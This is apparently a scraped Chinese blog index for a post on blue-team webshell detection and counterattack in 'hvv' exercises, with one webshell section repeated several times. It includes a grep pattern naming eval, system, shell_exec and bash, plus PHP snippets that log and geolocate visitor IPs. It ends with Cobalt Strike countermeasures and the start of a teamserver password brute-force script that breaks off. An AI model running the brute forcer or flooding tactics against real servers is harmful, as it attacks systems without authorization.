","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:7:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#webshell溯源反制"},{"categories":["hvv"],"content":"\rwebshell溯源反制：\rwebshell查杀：\r工具查杀：1、d盾： http://www.d99net.net/ 3、网站安全狗： https://www.safedog.cn/website_safedog.html 3、百度webshell查杀引擎： https://scanner.baidu.com/#/pages/intro 手工查杀：由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。 1.上传目录关键字查找 上传目录是最有可能存在websehll的，一般来说要优先排查上传目录 脚本代码排查： grep -rn php upload/ 关键字排查： 排查eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字 find /www/upload -name \"*.php\" |xargs egrep 'assert|bash|system|phpspy|c99sh|milw0rm|eval|\\(gunerpress|\\(base64_decoolcode|spider_bc|shell_exec|passthru|\\(\\$\\_\\POST\\[|eval\\(|file_put_contents|base64_decode' 2.web非上传目录排查增删改查 如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。 备份对比 对比非上传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析 vimdiff \u003c(cd /tmp/1.1; find . | sort) \u003c(cd /tmp/1.2; find . | sort) 3.时间戳排查 根据情况调取短期内改动文件进行分析 find / -mtime -10 -mtime +1 2\u003e/dev/null #一天前，十天内变动的文件 4.文件名排查 使用tree命令列举整个web目录文件，然后排查可疑文件 tree /var/www/ 5.日志排查 cat /var/log/apache2/access.log | grep \"antSword\" webshell反打：webshell嵌入js代码，获取红队定位信息甚至是拍照、获取IP地址甚至是经纬度信息 （只适用于有文件落地的，不适用于内存马，同时获取到的IP地址、经纬度信息的准确性也有待商榷，因为这一切的前提是攻击者直接用自己的网路远程操作webshell才行，否则我们获取的IP地址一样是跳板机的） 获取照片： Take Photo 获取攻击者访问的时间、ip： \u003c?php $ip = $_SERVER['REMOTE_ADDR']; echo \"Your IP address is: $ip\"; $ip=get_real_ip(); $dat=date('Y-m-d H:i:s',time()); $a=$dat.' '.'文件名称:'.' IP:'.$ip.\"\\n\"; $myfile=fopen(\"testfile.txt\", \"a+\"); fwrite($myfile, $a); fclose($myfile); function get_real_ip() { $ip=FALSE; //客户端IP 或 NONE if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])){ $ip = $_SERVER[\"HTTP_CLIENT_IP\"]; } //多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空 if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode (\", \", $_SERVER['HTTP_X_FORWARDED_FOR']); if ($ip) { array_unshift($ips, $ip); $ip = FALSE; } for ($i = 0; $i \u003c count($ips); $i++) { if (!eregi (\"^(10│172.16│192.168).\", $ips[$i])) { $ip = $ips[$i]; break; } } } //客户端IP 或 (最后一个)代理服务器 IP return ($ip ? $ip : $_SERVER['REMOTE_ADDR']); } ?\u003e 获取攻击者访问时间、ip后会在本地生成日志文件 获取经纬度： \u003c?php echo $_SERVER['HTTP_HOST']; $getIp=$_SERVER[\"REMOTE_ADDR\"]; echo 'IP:',$getIp; echo ''; $content = file_get_contents(\"http://api.map.baidu.com/location/ip?ak=自己去申请一个\u0026ip={$getIp}\u0026coor=bd09ll\"); $json = json_decode($content); echo 'log:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'x'};//按层级关系提取经度数据 echo ''; echo 'lat:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'y'};//按层级关系提取纬度数据 echo ''; print $json-\u003e{'content'}-\u003e{'address'};//按层级关系提取address数 echo $json-\u003e{'content'}-\u003e{'address_detail'}-\u003e{'city_code'}; print_r($json); ?\u003e 样本逆向分析： 大多数样本总会有返连行为，少数会进行命令连接，可能找到对方的CC服务器 钓鱼邮件分析： PDF信息获取等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:7:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#webshell查杀"},{"categories":["hvv"],"content":"\rwebshell溯源反制：\rwebshell查杀：\r工具查杀：1、d盾： http://www.d99net.net/ 3、网站安全狗： https://www.safedog.cn/website_safedog.html 3、百度webshell查杀引擎： https://scanner.baidu.com/#/pages/intro 手工查杀：由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。 1.上传目录关键字查找 上传目录是最有可能存在websehll的，一般来说要优先排查上传目录 脚本代码排查： grep -rn php upload/ 关键字排查： 排查eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字 find /www/upload -name \"*.php\" |xargs egrep 'assert|bash|system|phpspy|c99sh|milw0rm|eval|\\(gunerpress|\\(base64_decoolcode|spider_bc|shell_exec|passthru|\\(\\$\\_\\POST\\[|eval\\(|file_put_contents|base64_decode' 2.web非上传目录排查增删改查 如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。 备份对比 对比非上传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析 vimdiff \u003c(cd /tmp/1.1; find . | sort) \u003c(cd /tmp/1.2; find . | sort) 3.时间戳排查 根据情况调取短期内改动文件进行分析 find / -mtime -10 -mtime +1 2\u003e/dev/null #一天前，十天内变动的文件 4.文件名排查 使用tree命令列举整个web目录文件，然后排查可疑文件 tree /var/www/ 5.日志排查 cat /var/log/apache2/access.log | grep \"antSword\" webshell反打：webshell嵌入js代码，获取红队定位信息甚至是拍照、获取IP地址甚至是经纬度信息 （只适用于有文件落地的，不适用于内存马，同时获取到的IP地址、经纬度信息的准确性也有待商榷，因为这一切的前提是攻击者直接用自己的网路远程操作webshell才行，否则我们获取的IP地址一样是跳板机的） 获取照片： Take Photo 获取攻击者访问的时间、ip： \u003c?php $ip = $_SERVER['REMOTE_ADDR']; echo \"Your IP address is: $ip\"; $ip=get_real_ip(); $dat=date('Y-m-d H:i:s',time()); $a=$dat.' '.'文件名称:'.' IP:'.$ip.\"\\n\"; $myfile=fopen(\"testfile.txt\", \"a+\"); fwrite($myfile, $a); fclose($myfile); function get_real_ip() { $ip=FALSE; //客户端IP 或 NONE if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])){ $ip = $_SERVER[\"HTTP_CLIENT_IP\"]; } //多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空 if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode (\", \", $_SERVER['HTTP_X_FORWARDED_FOR']); if ($ip) { array_unshift($ips, $ip); $ip = FALSE; } for ($i = 0; $i \u003c count($ips); $i++) { if (!eregi (\"^(10│172.16│192.168).\", $ips[$i])) { $ip = $ips[$i]; break; } } } //客户端IP 或 (最后一个)代理服务器 IP return ($ip ? $ip : $_SERVER['REMOTE_ADDR']); } ?\u003e 获取攻击者访问时间、ip后会在本地生成日志文件 获取经纬度： \u003c?php echo $_SERVER['HTTP_HOST']; $getIp=$_SERVER[\"REMOTE_ADDR\"]; echo 'IP:',$getIp; echo ''; $content = file_get_contents(\"http://api.map.baidu.com/location/ip?ak=自己去申请一个\u0026ip={$getIp}\u0026coor=bd09ll\"); $json = json_decode($content); echo 'log:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'x'};//按层级关系提取经度数据 echo ''; echo 'lat:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'y'};//按层级关系提取纬度数据 echo ''; print $json-\u003e{'content'}-\u003e{'address'};//按层级关系提取address数 echo $json-\u003e{'content'}-\u003e{'address_detail'}-\u003e{'city_code'}; print_r($json); ?\u003e 样本逆向分析： 大多数样本总会有返连行为，少数会进行命令连接，可能找到对方的CC服务器 钓鱼邮件分析： PDF信息获取等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:7:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#工具查杀"},{"categories":["hvv"],"content":"\rwebshell溯源反制：\rwebshell查杀：\r工具查杀：1、d盾： http://www.d99net.net/ 3、网站安全狗： https://www.safedog.cn/website_safedog.html 3、百度webshell查杀引擎： https://scanner.baidu.com/#/pages/intro 手工查杀：由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。 1.上传目录关键字查找 上传目录是最有可能存在websehll的，一般来说要优先排查上传目录 脚本代码排查： grep -rn php upload/ 关键字排查： 排查eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字 find /www/upload -name \"*.php\" |xargs egrep 'assert|bash|system|phpspy|c99sh|milw0rm|eval|\\(gunerpress|\\(base64_decoolcode|spider_bc|shell_exec|passthru|\\(\\$\\_\\POST\\[|eval\\(|file_put_contents|base64_decode' 2.web非上传目录排查增删改查 如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。 备份对比 对比非上传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析 vimdiff \u003c(cd /tmp/1.1; find . | sort) \u003c(cd /tmp/1.2; find . | sort) 3.时间戳排查 根据情况调取短期内改动文件进行分析 find / -mtime -10 -mtime +1 2\u003e/dev/null #一天前，十天内变动的文件 4.文件名排查 使用tree命令列举整个web目录文件，然后排查可疑文件 tree /var/www/ 5.日志排查 cat /var/log/apache2/access.log | grep \"antSword\" webshell反打：webshell嵌入js代码，获取红队定位信息甚至是拍照、获取IP地址甚至是经纬度信息 （只适用于有文件落地的，不适用于内存马，同时获取到的IP地址、经纬度信息的准确性也有待商榷，因为这一切的前提是攻击者直接用自己的网路远程操作webshell才行，否则我们获取的IP地址一样是跳板机的） 获取照片： Take Photo 获取攻击者访问的时间、ip： \u003c?php $ip = $_SERVER['REMOTE_ADDR']; echo \"Your IP address is: $ip\"; $ip=get_real_ip(); $dat=date('Y-m-d H:i:s',time()); $a=$dat.' '.'文件名称:'.' IP:'.$ip.\"\\n\"; $myfile=fopen(\"testfile.txt\", \"a+\"); fwrite($myfile, $a); fclose($myfile); function get_real_ip() { $ip=FALSE; //客户端IP 或 NONE if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])){ $ip = $_SERVER[\"HTTP_CLIENT_IP\"]; } //多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空 if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode (\", \", $_SERVER['HTTP_X_FORWARDED_FOR']); if ($ip) { array_unshift($ips, $ip); $ip = FALSE; } for ($i = 0; $i \u003c count($ips); $i++) { if (!eregi (\"^(10│172.16│192.168).\", $ips[$i])) { $ip = $ips[$i]; break; } } } //客户端IP 或 (最后一个)代理服务器 IP return ($ip ? $ip : $_SERVER['REMOTE_ADDR']); } ?\u003e 获取攻击者访问时间、ip后会在本地生成日志文件 获取经纬度： \u003c?php echo $_SERVER['HTTP_HOST']; $getIp=$_SERVER[\"REMOTE_ADDR\"]; echo 'IP:',$getIp; echo ''; $content = file_get_contents(\"http://api.map.baidu.com/location/ip?ak=自己去申请一个\u0026ip={$getIp}\u0026coor=bd09ll\"); $json = json_decode($content); echo 'log:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'x'};//按层级关系提取经度数据 echo ''; echo 'lat:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'y'};//按层级关系提取纬度数据 echo ''; print $json-\u003e{'content'}-\u003e{'address'};//按层级关系提取address数 echo $json-\u003e{'content'}-\u003e{'address_detail'}-\u003e{'city_code'}; print_r($json); ?\u003e 样本逆向分析： 大多数样本总会有返连行为，少数会进行命令连接，可能找到对方的CC服务器 钓鱼邮件分析： PDF信息获取等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:7:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#手工查杀"},{"categories":["hvv"],"content":"\rwebshell溯源反制：\rwebshell查杀：\r工具查杀：1、d盾： http://www.d99net.net/ 3、网站安全狗： https://www.safedog.cn/website_safedog.html 3、百度webshell查杀引擎： https://scanner.baidu.com/#/pages/intro 手工查杀：由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。 1.上传目录关键字查找 上传目录是最有可能存在websehll的，一般来说要优先排查上传目录 脚本代码排查： grep -rn php upload/ 关键字排查： 排查eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字 find /www/upload -name \"*.php\" |xargs egrep 'assert|bash|system|phpspy|c99sh|milw0rm|eval|\\(gunerpress|\\(base64_decoolcode|spider_bc|shell_exec|passthru|\\(\\$\\_\\POST\\[|eval\\(|file_put_contents|base64_decode' 2.web非上传目录排查增删改查 如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。 备份对比 对比非上传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析 vimdiff \u003c(cd /tmp/1.1; find . | sort) \u003c(cd /tmp/1.2; find . | sort) 3.时间戳排查 根据情况调取短期内改动文件进行分析 find / -mtime -10 -mtime +1 2\u003e/dev/null #一天前，十天内变动的文件 4.文件名排查 使用tree命令列举整个web目录文件，然后排查可疑文件 tree /var/www/ 5.日志排查 cat /var/log/apache2/access.log | grep \"antSword\" webshell反打：webshell嵌入js代码，获取红队定位信息甚至是拍照、获取IP地址甚至是经纬度信息 （只适用于有文件落地的，不适用于内存马，同时获取到的IP地址、经纬度信息的准确性也有待商榷，因为这一切的前提是攻击者直接用自己的网路远程操作webshell才行，否则我们获取的IP地址一样是跳板机的） 获取照片： Take Photo 获取攻击者访问的时间、ip： \u003c?php $ip = $_SERVER['REMOTE_ADDR']; echo \"Your IP address is: $ip\"; $ip=get_real_ip(); $dat=date('Y-m-d H:i:s',time()); $a=$dat.' '.'文件名称:'.' IP:'.$ip.\"\\n\"; $myfile=fopen(\"testfile.txt\", \"a+\"); fwrite($myfile, $a); fclose($myfile); function get_real_ip() { $ip=FALSE; //客户端IP 或 NONE if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])){ $ip = $_SERVER[\"HTTP_CLIENT_IP\"]; } //多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空 if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode (\", \", $_SERVER['HTTP_X_FORWARDED_FOR']); if ($ip) { array_unshift($ips, $ip); $ip = FALSE; } for ($i = 0; $i \u003c count($ips); $i++) { if (!eregi (\"^(10│172.16│192.168).\", $ips[$i])) { $ip = $ips[$i]; break; } } } //客户端IP 或 (最后一个)代理服务器 IP return ($ip ? $ip : $_SERVER['REMOTE_ADDR']); } ?\u003e 获取攻击者访问时间、ip后会在本地生成日志文件 获取经纬度： \u003c?php echo $_SERVER['HTTP_HOST']; $getIp=$_SERVER[\"REMOTE_ADDR\"]; echo 'IP:',$getIp; echo ''; $content = file_get_contents(\"http://api.map.baidu.com/location/ip?ak=自己去申请一个\u0026ip={$getIp}\u0026coor=bd09ll\"); $json = json_decode($content); echo 'log:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'x'};//按层级关系提取经度数据 echo ''; echo 'lat:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'y'};//按层级关系提取纬度数据 echo ''; print $json-\u003e{'content'}-\u003e{'address'};//按层级关系提取address数 echo $json-\u003e{'content'}-\u003e{'address_detail'}-\u003e{'city_code'}; print_r($json); ?\u003e 样本逆向分析： 大多数样本总会有返连行为，少数会进行命令连接，可能找到对方的CC服务器 钓鱼邮件分析： PDF信息获取等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:7:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#webshell反打"},{"categories":["hvv"],"content":"\rwebshell溯源反制：\rwebshell查杀：\r工具查杀：1、d盾： http://www.d99net.net/ 3、网站安全狗： https://www.safedog.cn/website_safedog.html 3、百度webshell查杀引擎： https://scanner.baidu.com/#/pages/intro 手工查杀：由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。 1.上传目录关键字查找 上传目录是最有可能存在websehll的，一般来说要优先排查上传目录 脚本代码排查： grep -rn php upload/ 关键字排查： 排查eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字 find /www/upload -name \"*.php\" |xargs egrep 'assert|bash|system|phpspy|c99sh|milw0rm|eval|\\(gunerpress|\\(base64_decoolcode|spider_bc|shell_exec|passthru|\\(\\$\\_\\POST\\[|eval\\(|file_put_contents|base64_decode' 2.web非上传目录排查增删改查 如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。 备份对比 对比非上传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析 vimdiff \u003c(cd /tmp/1.1; find . | sort) \u003c(cd /tmp/1.2; find . | sort) 3.时间戳排查 根据情况调取短期内改动文件进行分析 find / -mtime -10 -mtime +1 2\u003e/dev/null #一天前，十天内变动的文件 4.文件名排查 使用tree命令列举整个web目录文件，然后排查可疑文件 tree /var/www/ 5.日志排查 cat /var/log/apache2/access.log | grep \"antSword\" webshell反打：webshell嵌入js代码，获取红队定位信息甚至是拍照、获取IP地址甚至是经纬度信息 （只适用于有文件落地的，不适用于内存马，同时获取到的IP地址、经纬度信息的准确性也有待商榷，因为这一切的前提是攻击者直接用自己的网路远程操作webshell才行，否则我们获取的IP地址一样是跳板机的） 获取照片： Take Photo 获取攻击者访问的时间、ip： \u003c?php $ip = $_SERVER['REMOTE_ADDR']; echo \"Your IP address is: $ip\"; $ip=get_real_ip(); $dat=date('Y-m-d H:i:s',time()); $a=$dat.' '.'文件名称:'.' IP:'.$ip.\"\\n\"; $myfile=fopen(\"testfile.txt\", \"a+\"); fwrite($myfile, $a); fclose($myfile); function get_real_ip() { $ip=FALSE; //客户端IP 或 NONE if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])){ $ip = $_SERVER[\"HTTP_CLIENT_IP\"]; } //多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空 if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode (\", \", $_SERVER['HTTP_X_FORWARDED_FOR']); if ($ip) { array_unshift($ips, $ip); $ip = FALSE; } for ($i = 0; $i \u003c count($ips); $i++) { if (!eregi (\"^(10│172.16│192.168).\", $ips[$i])) { $ip = $ips[$i]; break; } } } //客户端IP 或 (最后一个)代理服务器 IP return ($ip ? $ip : $_SERVER['REMOTE_ADDR']); } ?\u003e 获取攻击者访问时间、ip后会在本地生成日志文件 获取经纬度： \u003c?php echo $_SERVER['HTTP_HOST']; $getIp=$_SERVER[\"REMOTE_ADDR\"]; echo 'IP:',$getIp; echo ''; $content = file_get_contents(\"http://api.map.baidu.com/location/ip?ak=自己去申请一个\u0026ip={$getIp}\u0026coor=bd09ll\"); $json = json_decode($content); echo 'log:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'x'};//按层级关系提取经度数据 echo ''; echo 'lat:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'y'};//按层级关系提取纬度数据 echo ''; print $json-\u003e{'content'}-\u003e{'address'};//按层级关系提取address数 echo $json-\u003e{'content'}-\u003e{'address_detail'}-\u003e{'city_code'}; print_r($json); ?\u003e 样本逆向分析： 大多数样本总会有返连行为，少数会进行命令连接，可能找到对方的CC服务器 钓鱼邮件分析： PDF信息获取等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:7:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#获取照片"},{"categories":["hvv"],"content":"\rwebshell溯源反制：\rwebshell查杀：\r工具查杀：1、d盾： http://www.d99net.net/ 3、网站安全狗： https://www.safedog.cn/website_safedog.html 3、百度webshell查杀引擎： https://scanner.baidu.com/#/pages/intro 手工查杀：由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。 1.上传目录关键字查找 上传目录是最有可能存在websehll的，一般来说要优先排查上传目录 脚本代码排查： grep -rn php upload/ 关键字排查： 排查eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字 find /www/upload -name \"*.php\" |xargs egrep 'assert|bash|system|phpspy|c99sh|milw0rm|eval|\\(gunerpress|\\(base64_decoolcode|spider_bc|shell_exec|passthru|\\(\\$\\_\\POST\\[|eval\\(|file_put_contents|base64_decode' 2.web非上传目录排查增删改查 如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。 备份对比 对比非上传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析 vimdiff \u003c(cd /tmp/1.1; find . | sort) \u003c(cd /tmp/1.2; find . | sort) 3.时间戳排查 根据情况调取短期内改动文件进行分析 find / -mtime -10 -mtime +1 2\u003e/dev/null #一天前，十天内变动的文件 4.文件名排查 使用tree命令列举整个web目录文件，然后排查可疑文件 tree /var/www/ 5.日志排查 cat /var/log/apache2/access.log | grep \"antSword\" webshell反打：webshell嵌入js代码，获取红队定位信息甚至是拍照、获取IP地址甚至是经纬度信息 （只适用于有文件落地的，不适用于内存马，同时获取到的IP地址、经纬度信息的准确性也有待商榷，因为这一切的前提是攻击者直接用自己的网路远程操作webshell才行，否则我们获取的IP地址一样是跳板机的） 获取照片： Take Photo 获取攻击者访问的时间、ip： \u003c?php $ip = $_SERVER['REMOTE_ADDR']; echo \"Your IP address is: $ip\"; $ip=get_real_ip(); $dat=date('Y-m-d H:i:s',time()); $a=$dat.' '.'文件名称:'.' IP:'.$ip.\"\\n\"; $myfile=fopen(\"testfile.txt\", \"a+\"); fwrite($myfile, $a); fclose($myfile); function get_real_ip() { $ip=FALSE; //客户端IP 或 NONE if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])){ $ip = $_SERVER[\"HTTP_CLIENT_IP\"]; } //多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空 if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode (\", \", $_SERVER['HTTP_X_FORWARDED_FOR']); if ($ip) { array_unshift($ips, $ip); $ip = FALSE; } for ($i = 0; $i \u003c count($ips); $i++) { if (!eregi (\"^(10│172.16│192.168).\", $ips[$i])) { $ip = $ips[$i]; break; } } } //客户端IP 或 (最后一个)代理服务器 IP return ($ip ? $ip : $_SERVER['REMOTE_ADDR']); } ?\u003e 获取攻击者访问时间、ip后会在本地生成日志文件 获取经纬度： \u003c?php echo $_SERVER['HTTP_HOST']; $getIp=$_SERVER[\"REMOTE_ADDR\"]; echo 'IP:',$getIp; echo ''; $content = file_get_contents(\"http://api.map.baidu.com/location/ip?ak=自己去申请一个\u0026ip={$getIp}\u0026coor=bd09ll\"); $json = json_decode($content); echo 'log:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'x'};//按层级关系提取经度数据 echo ''; echo 'lat:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'y'};//按层级关系提取纬度数据 echo ''; print $json-\u003e{'content'}-\u003e{'address'};//按层级关系提取address数 echo $json-\u003e{'content'}-\u003e{'address_detail'}-\u003e{'city_code'}; print_r($json); ?\u003e 样本逆向分析： 大多数样本总会有返连行为，少数会进行命令连接，可能找到对方的CC服务器 钓鱼邮件分析： PDF信息获取等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:7:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#获取攻击者访问的时间ip"},{"categories":["hvv"],"content":"\rwebshell溯源反制：\rwebshell查杀：\r工具查杀：1、d盾： http://www.d99net.net/ 3、网站安全狗： https://www.safedog.cn/website_safedog.html 3、百度webshell查杀引擎： https://scanner.baidu.com/#/pages/intro 手工查杀：由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。 1.上传目录关键字查找 上传目录是最有可能存在websehll的，一般来说要优先排查上传目录 脚本代码排查： grep -rn php upload/ 关键字排查： 排查eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字 find /www/upload -name \"*.php\" |xargs egrep 'assert|bash|system|phpspy|c99sh|milw0rm|eval|\\(gunerpress|\\(base64_decoolcode|spider_bc|shell_exec|passthru|\\(\\$\\_\\POST\\[|eval\\(|file_put_contents|base64_decode' 2.web非上传目录排查增删改查 如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。 备份对比 对比非上传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析 vimdiff \u003c(cd /tmp/1.1; find . | sort) \u003c(cd /tmp/1.2; find . | sort) 3.时间戳排查 根据情况调取短期内改动文件进行分析 find / -mtime -10 -mtime +1 2\u003e/dev/null #一天前，十天内变动的文件 4.文件名排查 使用tree命令列举整个web目录文件，然后排查可疑文件 tree /var/www/ 5.日志排查 cat /var/log/apache2/access.log | grep \"antSword\" webshell反打：webshell嵌入js代码，获取红队定位信息甚至是拍照、获取IP地址甚至是经纬度信息 （只适用于有文件落地的，不适用于内存马，同时获取到的IP地址、经纬度信息的准确性也有待商榷，因为这一切的前提是攻击者直接用自己的网路远程操作webshell才行，否则我们获取的IP地址一样是跳板机的） 获取照片： Take Photo 获取攻击者访问的时间、ip： \u003c?php $ip = $_SERVER['REMOTE_ADDR']; echo \"Your IP address is: $ip\"; $ip=get_real_ip(); $dat=date('Y-m-d H:i:s',time()); $a=$dat.' '.'文件名称:'.' IP:'.$ip.\"\\n\"; $myfile=fopen(\"testfile.txt\", \"a+\"); fwrite($myfile, $a); fclose($myfile); function get_real_ip() { $ip=FALSE; //客户端IP 或 NONE if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])){ $ip = $_SERVER[\"HTTP_CLIENT_IP\"]; } //多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空 if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode (\", \", $_SERVER['HTTP_X_FORWARDED_FOR']); if ($ip) { array_unshift($ips, $ip); $ip = FALSE; } for ($i = 0; $i \u003c count($ips); $i++) { if (!eregi (\"^(10│172.16│192.168).\", $ips[$i])) { $ip = $ips[$i]; break; } } } //客户端IP 或 (最后一个)代理服务器 IP return ($ip ? $ip : $_SERVER['REMOTE_ADDR']); } ?\u003e 获取攻击者访问时间、ip后会在本地生成日志文件 获取经纬度： \u003c?php echo $_SERVER['HTTP_HOST']; $getIp=$_SERVER[\"REMOTE_ADDR\"]; echo 'IP:',$getIp; echo ''; $content = file_get_contents(\"http://api.map.baidu.com/location/ip?ak=自己去申请一个\u0026ip={$getIp}\u0026coor=bd09ll\"); $json = json_decode($content); echo 'log:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'x'};//按层级关系提取经度数据 echo ''; echo 'lat:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'y'};//按层级关系提取纬度数据 echo ''; print $json-\u003e{'content'}-\u003e{'address'};//按层级关系提取address数 echo $json-\u003e{'content'}-\u003e{'address_detail'}-\u003e{'city_code'}; print_r($json); ?\u003e 样本逆向分析： 大多数样本总会有返连行为，少数会进行命令连接，可能找到对方的CC服务器 钓鱼邮件分析： PDF信息获取等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:7:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#获取经纬度"},{"categories":["hvv"],"content":"\rCobalt Strike反制在防守里面,必不可少的是钓鱼邮件,或者社工钓鱼,一般来说钓鱼的样本无非这几种,exe elf可执行文件,以及加了料的doc类宏木马,一般而言,目前红队主要是通过cobalt strike生成相关上线的shell 批量上线钓鱼马,启几百个进程mddos红方的cs端.假如我们获取到了红方的cs样本,那么第一种方法可以批量启几百个进程运行该样本(注意隔离环境),然后红方的cs端几乎瘫痪,无法使用 爆破cs密码 一般而言,红队的cs设施为了多人运动,密码通常不会太复杂,很大机会是弱口令为主,甚至teamserver端口50050,那么针对cs端控制端,可以直接进行密码爆破 假上线,我们只需要发送心跳包,即可模拟上线,并且攻击者无法执行命令.使用时更改换IP或域名、port、cookie 附CS爆破密码脚本 #!/usr/bin/env python3 import time import socket import ssl import argparse import concurrent.futures import sys # csbrute.py - Cobalt Strike Team Server Password Brute Forcer # https://stackoverflow.com/questions/6224736/how-to-write-python-code-that-is-able-to-properly-require-a-minimal-python-versi MIN_PYTHON = (3, 3) if sys.version_info \u003c MIN_PYTHON: sys.exit(\"Python %s.%s or later is required.\\n\" % MIN_PYTHON) parser = argparse.ArgumentParser() parser.add_argument(\"host\", help=\"Teamserver address\") parser.add_argument(\"wordlist\", nargs=\"?\", help=\"Newline-delimited word list file\") parser.add_argument(\"-p\", dest=\"port\", default=50050, type=int, help=\"Teamserver port\") parser.add_argument(\"-t\", dest=\"threads\", default=25, type=int, help=\"Concurrency level\") args = parser.parse_args() # https://stackoverflow.com/questions/27679890/how-to-handle-ssl-connections-in-raw-python-socket class NotConnectedException(Exception): def __init__(self, message=None, node=None): self.message = message self.node = node class DisconnectedException(Exception): def __init__(self, message=None, node=None): self.message = message self.node = node class Connector: def __init__(self): self.sock = None self.ssl_sock = None self.ctx = ssl.SSLContext() 